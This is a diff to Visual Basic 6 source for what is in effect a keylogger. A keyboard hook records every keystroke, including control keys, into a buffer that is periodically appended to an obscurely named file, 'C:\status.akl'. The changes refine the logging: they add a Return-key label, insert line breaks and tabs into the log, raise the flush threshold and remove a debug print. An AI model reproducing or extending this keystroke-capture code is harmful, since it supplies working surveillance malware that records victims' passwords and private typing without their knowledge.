@@ -53,7 +53,7 @@ Dim PressedControl As Boolean
 Dim PressedShift As Boolean
 Dim PressedAlt As Boolean
 Dim LastTimePressed As Date
-Dim Buffer As String
+Dim Buffer As String, CntVbCrlF As Integer
 Private Declare Function GetKeyboardState Lib "user32" (pbKeyState As Byte) As Long
 Private Declare Function ToAscii Lib "user32" (ByVal uVirtKey As Long, ByVal uScanCode As Long, lpbKeyState As Byte, lpwTransKey As Long, ByVal fuState As Long) As Long
 
@@ -73,6 +73,7 @@ Private Sub Form_Load()
     Save
     Buffer = ""
     LastTimePressed = Now
+    CntVbCrlF = 1
 End Sub
 
 Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
@@ -103,6 +104,7 @@ Private Sub MyEventRaiser_KBHKeyDown(ByVal vkCode As Integer, ByVal scanCode As 
         Case vbKeyDown:                 KeyPressed = "[Down]"
         Case vbKeyLeft:                 KeyPressed = "[Left]"
         Case vbKeyRight:                KeyPressed = "[Right]"
+        Case vbKeyReturn:               KeyPressed = "[Return]"
         Case vbKeyControl, vbKeyShift, OtrosVK.VK_Alt, OtrosVK.VK_LAlt, 160, 161, 165, 162:
         KeyPressed = ""
         Case VK_LWin, VK_RWin:          KeyPressed = "[Win]"
@@ -127,9 +129,15 @@ Private Sub MyEventRaiser_KBHKeyDown(ByVal vkCode As Integer, ByVal scanCode As 
     
     Dim s As Integer
     s = DateDiff("m", LastTimePressed, Now)
-    If s > 50 Or Len(Buffer) > 100 Then
+    If Len(Buffer) > (100 * CntVbCrlF) And CntVbCrlF < 3 Then
+        Buffer = Buffer & vbCrLf: CntVbCrlF = CntVbCrlF + 1
+        For i = 1 To 7: Buffer = Buffer & Chr(9): Next
+    End If
+    
+    If s > 50 Or Len(Buffer) > 300 Then
         Save
         Buffer = ""
+        CntVbCrlF = 1
     End If
        
     LastTimePressed = Now
@@ -139,6 +147,7 @@ Private Sub MyEventRaiser_KBHKeyUp(ByVal vkCode As Integer, ByVal scanCode As In
     Text1.Text = Text1.Text & "up vk:" & vkCode & " sc:" & scanCode & " fl:" & flags & " vk chr:" & Chr(vkCode) & vbCrLf
     Text1.SelStart = Len(Text1.Text) - 1
     Text1.SelLength = 1
+    'sin usarse, serviria para usar combinaciones de teclas, mas adelante vere que rollo
     Select Case vkCode
         Case vbKeyControl:                                  PressedControl = False
         Case vbKeyShift:                                    PressedShift = False
@@ -150,5 +159,4 @@ Sub Save()
     Open "C:\status.akl" For Append As #1
         Print #1, Buffer
     Close #1
-    Debug.Print "saved? " & Buffer
 End Sub
